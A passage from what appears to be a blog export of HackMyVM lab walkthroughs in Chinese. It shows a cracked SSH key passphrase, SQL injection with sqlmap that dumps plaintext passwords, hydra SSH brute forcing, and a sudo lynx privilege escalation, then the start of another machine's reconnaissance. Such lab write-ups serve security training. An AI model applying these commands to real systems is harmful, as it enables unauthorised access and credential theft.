class="line">uUZN0OH6pJbmj3oxHSB6ADFetH7bVFXKC4VjTGltoRWD3sH2n5UIcVZZ<span class="operator">+</span><span class="number">1</span>qha3n37U8Q1<span class="symbol">/</span></span><br><span class="line">OVwSqtTE6NbYQsnsydv9plM1xLkacY9<span class="operator">+</span>db35wPBQSVkuiTuENKUbDMIFC8GiFTzshG9Owr</span><br><span class="line"><span class="number">8</span>LvdK<span class="operator">+</span>LSxCrjQcAch7AYFma7IEtkJDHHAC2dwHw<span class="operator">+</span>ojqb510c9d5oBAd<span class="symbol">/vboElE9ZjYbOq2</span></span><br><span class="line">WT9UdY26<span class="symbol">/LOQ1LZVZ9LU3hW+N9zRLgJZz6jfvELGlS2jxNjBVW8+0dGHOBFxu+lHjyZCaA</span></span><br><span class="line">YaUwJvd2lTkoLIH3o7Wog7c69tTtVP39Lx2trFCRtWs0eJIP6bGMsB83nwWzxiRnUKX5<span class="symbol">/3</span></span><br><span class="line">anvv<span class="symbol">/RtCRJoEsSX9vtXJpMnE4ZXO4H7LglGWe/dlIRkF/Pm81FPB+kiuAYbe+CRVIvEC+m</span></span><br><span class="line">dkCybp6<span class="operator">++</span>R<span class="symbol">/Td2GQ/uh3Iz3Q6CbmGEpnjAtUBjizQc4vrPpB0tgsEXpzB5ZAj10IjgK6a+</span></span><br><span class="line"><span class="number">2</span>PIaEbU2nsSic6JT1tN8GOAx3kca<span class="operator">+</span>x94PZ9quSvGxBIjCcre5IC1vDPSl9ltPIZwwvDIbN</span><br><span class="line">ORebGQ41OO<span class="operator">++</span>boyqMUAeWPCp0U16acJ7l<span class="symbol">/copQQcuIZ0mTched3eyetddQ5FMCHv2EbvK5</span></span><br><span class="line">ovZ9EUC8ryJgnq1<span class="operator">/</span><span class="operator">+</span>ECUOutT5q49Q<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<p>直接用这个私钥登录 提示要passphrase ，所以先用john破解一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh2john id_rsa &gt; hash                               </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# john <span class="comment">--wordlist=./rockyou.txt hash                     </span></span><br><span class="line"><span class="keyword">Using</span> <span class="keyword">default</span> <span class="keyword">input</span> <span class="keyword">encoding</span>: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">1</span> (KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]) <span class="keyword">is</span> <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">2</span> (iteration count) <span class="keyword">is</span> <span class="number">16</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">ihateu           (id_rsa)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">42</span> DONE (<span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">23</span>:<span class="number">01</span>) <span class="number">0.02329</span>g/s <span class="number">29.07</span>p/s <span class="number">29.07</span>c/s <span class="number">29.07</span>C/s ramona..shirley</span><br><span class="line">Use the &quot;--show&quot; <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed. </span><br></pre></td></tr></table></figure></div>
<p>找到violent的密码是<code>ihateu</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">violent<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>find / -user violent -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span> | grep -ivE <span class="string">&quot;sys|run|proc&quot;</span></span><br><span class="line"><span class="regexp">/home/violent</span></span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.bash_logout</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh/authorized</span>_keys</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.ssh/id</span>_rsa.pub</span><br><span class="line"><span class="regexp">/home/violent</span><span class="regexp">/.bash_history</span></span><br><span class="line"><span class="regexp">/home</span><span class="regexp">/violent/</span>.profile</span><br><span class="line"><span class="regexp">/dev/pts</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></div>
<p>找了一下这个用户也没有有用的信息，所以最后还是要回到theuser用户，然后得到suidy用户的权限</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机好奇怪，设置了这么多误导项，但是一开始就可以登录theuser用户，感觉完全也没必要，然后后面应该提权部分也有点bug<br>我猜是对文件大小有判断的，但是我稍微写下设置uid的c文件大小就一样了。。</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Talk</title>
    <url>/posts/41749.html</url>
    <content><![CDATA[<p>HMV-Talk靶机复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.47</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">19</span> <span class="number">11</span>:<span class="number">09</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.47</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> e3:fc:<span class="number">1</span>b:<span class="number">74</span>:e5:e3:c9:ef:<span class="number">6</span>d:ac:df:b1:<span class="number">1</span>e:<span class="number">47</span>:<span class="number">83</span>:ad (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">10</span>:bd:<span class="number">60</span>:<span class="number">33</span>:a0:d1:a4:<span class="number">7</span>d:de:c8:<span class="number">29</span>:<span class="number">0</span>a:c4:<span class="number">7</span>d:b1:aa (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>b:fc:<span class="number">30</span>:a8:<span class="number">12</span>:<span class="number">69</span>:e7:b2:ce:ad:<span class="number">99</span>:f1:<span class="number">66</span>:<span class="number">12</span>:cd:<span class="number">8</span>c (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">| <span class="params">http-cookie-flags:</span> </span><br><span class="line">|   <span class="operator">/</span>: </span><br><span class="line">|     <span class="params">PHPSESSID:</span> </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|<span class="params">_http-title:</span> chatME</span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">7</span>E:<span class="number">2</span>E:BE:B7:<span class="number">58</span>:B6 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.40</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.47</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.72</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p><img src="https://pic1.imgdb.cn/item/67b54bb5d0e0a243d400a705.png"><br>是一个登录界面，但是可以注册账号<br>注册之后可以登录，是一个聊天框<br><img src="https://pic1.imgdb.cn/item/67b54bf3d0e0a243d400a713.png"><br>扫了下目录也没有其他的，这个登录位置也不能爆破，那就sql注入试试了<br>bp抓包login界面，把包内容放在一个txt文件里，然后用sql对这个文件扫描，指定字段是username<br>sqlmap可以成功sql注入，接下来就是爆库 爆表 字段，得到账户密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat tmp.txt        </span></span><br><span class="line">POST //login.php HTTP/1.1</span><br><span class="line">Host: 192.168.112.47</span><br><span class="line">Content-Length: 25</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.112.47</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<span class="symbol">*</span>/<span class="symbol">*</span>;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.112.47//index.php?attempt=failed</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=mb3h6lao2hsvuiiduk34js813o</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=111&amp;password=111</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch   </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch --dbs</span></span><br><span class="line">available databases [4]:</span><br><span class="line">[<span class="symbol">*</span>] chat</span><br><span class="line">[<span class="symbol">*</span>] information_schema</span><br><span class="line">[<span class="symbol">*</span>] mysql</span><br><span class="line">[<span class="symbol">*</span>] performance_schema</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch -D chat --tables</span></span><br><span class="line">[3 tables]</span><br><span class="line">+-----------+</span><br><span class="line">|<span class="string"> user      </span>|</span><br><span class="line">|<span class="string"> chat      </span>|</span><br><span class="line">|<span class="string"> chat_room </span>|</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch -D chat -T user --columns --dump</span></span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">|<span class="string"> Column    </span>|<span class="string"> Type         </span>|</span><br><span class="line">+-----------+--------------+</span><br><span class="line">|<span class="string"> email     </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> password  </span>|<span class="string"> varchar(30)  </span>|</span><br><span class="line">|<span class="string"> phone     </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> userid    </span>|<span class="string"> int(11)      </span>|</span><br><span class="line">|<span class="string"> username  </span>|<span class="string"> varchar(30)  </span>|</span><br><span class="line">|<span class="string"> your_name </span>|<span class="string"> varchar(60)  </span>|</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># sqlmap -l tmp.txt -p &quot;username&quot; --batch -D chat -T user -C username,password --dump</span></span><br><span class="line">        ___</span><br><span class="line"></span><br><span class="line">+----------+-----------------+</span><br><span class="line">|<span class="string"> username </span>|<span class="string"> password        </span>|</span><br><span class="line">+----------+-----------------+</span><br><span class="line">|<span class="string"> david    </span>|<span class="string"> adrianthebest   </span>|</span><br><span class="line">|<span class="string"> tina     </span>|<span class="string"> davidwhatpass   </span>|</span><br><span class="line">|<span class="string"> kakeru   </span>|<span class="string"> kakeru          </span>|</span><br><span class="line">|<span class="string"> nona     </span>|<span class="string"> myfriendtom     </span>|</span><br><span class="line">|<span class="string"> pao      </span>|<span class="string"> pao             </span>|</span><br><span class="line">|<span class="string"> jerry    </span>|<span class="string"> thatsmynonapass </span>|</span><br><span class="line">+----------+-----------------+</span><br></pre></td></tr></table></figure></div>
<p>然后用hydra爆破ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -L <span class="keyword">user</span>.txt -P pass.txt ssh://<span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>                                                            </span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-19</span> <span class="number">12</span>:<span class="number">06</span>:<span class="number">10</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">25</span> <span class="keyword">login</span> tries (l:<span class="number">5</span>/p:<span class="number">5</span>), ~<span class="number">2</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>   <span class="keyword">login</span>: nona   <span class="keyword">password</span>: thatsmynonapass</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>   <span class="keyword">login</span>: david   <span class="keyword">password</span>: davidwhatpass</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.112</span><span class="number">.47</span>   <span class="keyword">login</span>: jerry   <span class="keyword">password</span>: myfriendtom</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">3</span> <span class="keyword">valid</span> passwords <span class="built_in">found</span></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-19</span> <span class="number">12</span>:<span class="number">06</span>:<span class="number">19</span></span><br></pre></td></tr></table></figure></div>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>登录nona用户，有一个sudo权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">nona<span class="variable">@talk</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> nona on <span class="symbol">talk:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> nona may run the following commands on <span class="symbol">talk:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/lynx</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这个文件是个可执行文件，搜索了一下发现了是个网页查看器，而且可以用file协议读取文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">nona<span class="variable">@talk</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/bin/lynx <span class="symbol">file:</span>/<span class="regexp">//root</span><span class="regexp">/root.txt</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Forbidden</title>
    <url>/posts/26924.html</url>
    <content><![CDATA[<p>HMV-Forbidden靶机复盘</p>
<span id="more"></span>
<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nmap -A <span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>     </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-02</span> <span class="number">13</span>:<span class="number">56</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>)</span><br><span class="line">Host is up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp     vsftpd <span class="number">3.0</span><span class="number">.3</span></span><br><span class="line">| <span class="type">ftp</span>-syst: </span><br><span class="line">|   <span class="type">STAT</span>: </span><br><span class="line">| <span class="type">FTP</span> server status:</span><br><span class="line">|      <span class="type">Connected</span> to ::ffff:<span class="number">192.168</span><span class="number">.58</span><span class="number">.11</span></span><br><span class="line">|      <span class="type">Logged</span> <span class="built_in">in</span> <span class="built_in">as</span> ftp</span><br><span class="line">|      <span class="type">TYPE</span>: ASCII</span><br><span class="line">|      <span class="type">No</span> session bandwidth limit</span><br><span class="line">|      <span class="type">Session</span> <span class="built_in">timeout</span> <span class="built_in">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      <span class="type">Control</span> connection is plain text</span><br><span class="line">|      <span class="type">Data</span> connections will be plain text</span><br><span class="line">|      <span class="type">At</span> session startup, client count was <span class="number">3</span></span><br><span class="line">|      <span class="type">vsFTPd</span> <span class="number">3.0</span><span class="number">.3</span> - secure, fast, stable</span><br><span class="line">|<span class="type">_End</span> of status</span><br><span class="line">| <span class="type">ftp</span>-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|<span class="type">_drwxrwxrwx</span>    <span class="number">2</span> <span class="number">0</span>        <span class="number">0</span>            <span class="number">4096</span> Oct <span class="number">09</span>  <span class="number">2020</span> www [NSE: writeable]</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">|<span class="type">_http</span>-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|<span class="type">_http</span>-server-header: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">MAC Address: <span class="number">6</span>E:<span class="number">0</span>B:<span class="number">06</span>:<span class="number">76</span>:<span class="number">34</span>:C6 (Unknown)</span><br><span class="line">Device type: general purpose|<span class="type">router</span></span><br><span class="line">Running: Linux <span class="number">4.</span>X|<span class="type">5</span>.X, MikroTik RouterOS <span class="number">7.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">4</span> cpe:/o:linux:linux_kernel:<span class="number">5</span> cpe:/o:mikrotik:routeros:<span class="number">7</span> cpe:/o:linux:linux_kernel:<span class="number">5.6</span><span class="number">.3</span></span><br><span class="line">OS details: Linux <span class="number">4.15</span> - <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> - <span class="number">7.5</span> (Linux <span class="number">5.6</span><span class="number">.3</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.66</span> ms bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results <span class="built_in">at</span> https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="built_in">in</span> <span class="number">8.84</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>开放21和80，先去ftp这里看看能不能匿名登录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Oct 09  2020 .</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..</span><br><span class="line">-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html</span><br><span class="line">-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt</span><br><span class="line">-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cat note.txt</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; get note.txt</span><br><span class="line">local: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||39793|)</span><br><span class="line">150 Opening BINARY mode data connection for note.txt (75 bytes).</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*|    75       14.41 KiB/s    00:00 ETA</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">226 Transfer complete.</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">75 bytes received in 00:00 (8.37 KiB/s)</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">ftp&gt; get robots.txt</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">local: robots.txt remote: robots.txt</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">229 Entering Extended Passive Mode (|||36280|)</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">150 Opening BINARY mode data connection for robots.txt (10 bytes).</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">100% |*</span>**</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span>|    10        6.60 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">10 bytes received in 00:00 (2.20 KiB/s)</span><br></pre></td></tr></table></figure></div>
<p>登录上去之后发现www目录下面有三个文件，我们直接get拿到本地来，这里应该用目录扫描也能得到这几个文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat note.txt      </span></span><br><span class="line">The extra-secured .jpg <span class="built_in">file</span> <span class="keyword">contains</span> <span class="keyword">my</span> password <span class="keyword">but</span> nobody can obtain <span class="keyword">it</span>.</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat robots.txt </span></span><br><span class="line">/note.txt</span><br></pre></td></tr></table></figure></div>


<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">SECURE WEB/FTP</span><br><span class="line">Hi, Im the best admin of the world. You cannot<span class="built_in"> execute </span>.php code on this server so you cannot obtain a reverse shell. Not sure<span class="built_in"> if </span>its misconfigured another things... but the importart is that php is disabled. -marta</span><br></pre></td></tr></table></figure></div>
<p>这里一直在强调php被ban不能反弹shell  然后还有一个用户名marta<br>那现在就是目录扫描web服务，然后找到扩展名是.jpg的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.58.239  -x jpg,php,txt,js</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.58.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              